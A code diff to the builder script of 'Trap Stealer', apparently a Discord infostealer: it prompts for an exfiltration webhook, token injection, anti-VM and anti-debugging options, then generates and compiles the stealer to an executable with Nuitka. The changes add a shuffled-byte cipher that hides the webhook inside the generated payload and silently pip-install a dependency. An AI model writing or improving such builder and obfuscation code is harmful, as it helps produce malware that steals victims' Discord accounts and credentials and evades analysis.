@@ -1,4 +1,4 @@
-import os, platform, subprocess, shutil
+import os, platform, subprocess, shutil, random
 while True:
     os.makedirs('./Build', exist_ok=True)
     shutil.copy('main.py', './Build/Trap-Stl-Building.py')
@@ -30,8 +30,22 @@ while True:
     No_Debug = get_boolean_input('Do you want to enable VM Checker and Anti Debugging Y/N: ')
     Close = get_boolean_input('Do you want to prevent Discord from being launched again? Y/N: ')
 
+    def generate_key(length):
+        key = list(range(256))
+        random.shuffle(key)
+        return bytes(key[:length])
 
-    new_content = content.replace("%Webhook%", Webhook)
+    def obf(text, key):
+        encrypted = []
+        for char in text:
+            encrypted_char = key[char]
+            encrypted.append(encrypted_char)
+        return bytes(encrypted)
+    key_length = 512  
+    custom_key = generate_key(key_length) 
+
+    Webhook = obf(Webhook.encode(), custom_key)
+    new_content = content.replace("'%Webhook%'", str(Webhook)+','+str(custom_key))
     new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
     new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
     new_content = new_content.replace("'%Injection%'", str(Injection))
@@ -46,7 +60,7 @@ while True:
 
     Obfuscation = input('Do you want to obfuscate it? Y/N: ')
     Obfuscation = Obfuscation.lower()
-    Exe = input('Do you want to make Trap Stealer with the exe format? (Take 5 minutes) Y/N: ')
+    Exe = input('Do you want to make Trap Stealer with the exe format? (Take some time) Y/N: ')
     Exe = Exe.lower()
     name = input('Enter how you want the file to be named (Do not put the extension): ')
     while True:
@@ -63,20 +77,27 @@ while True:
             with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                 file.write(new_content)
                 print(f'[+] File Created {name}.py')
-                input('Press any key to quit...')
+                if Exe in ['y', 'yes']:
+                    pass
+                else:input('Press any key to quit...')
                 break 
         else:
             Obfuscation = input('Invalid input. Please enter Y or N: ')
             Obfuscation = Obfuscation.lower()
 
     while True:
-
-        
         if Exe in ['y', 'yes']:
+            from sys import executable, stderr
+            try:
+                __import__('Crypto')
+            except ImportError:
+                subprocess.Popen(f"\"{executable}\" -m pip install 'Crypto' --quiet", shell=True)        
+
+
             command = [
                 'nuitka',
                 '--onefile',
-                '--include-module=ctypes,sqlite3,Crypto,requests,optparse',
+                '--include-module=ctypes,sqlite3,cryptography,requests,optparse',
                 f'--output-dir=./Build',
                 f'./Build/{name}.py'
             ]
@@ -87,9 +108,6 @@ while True:
             subprocess.run(command, check=True, shell=True)
             input(f'File {name}.exe successfully created press any key to quit')
             quit()
-        elif Exe in ['n', 'no']:
-            input('You chose not to create an exe. Press any key to quit')
-            quit()
         else:
-            print('Invalid input for creating an exe. Please enter Y or N.')
+            input('Press any key to quit')
             quit()
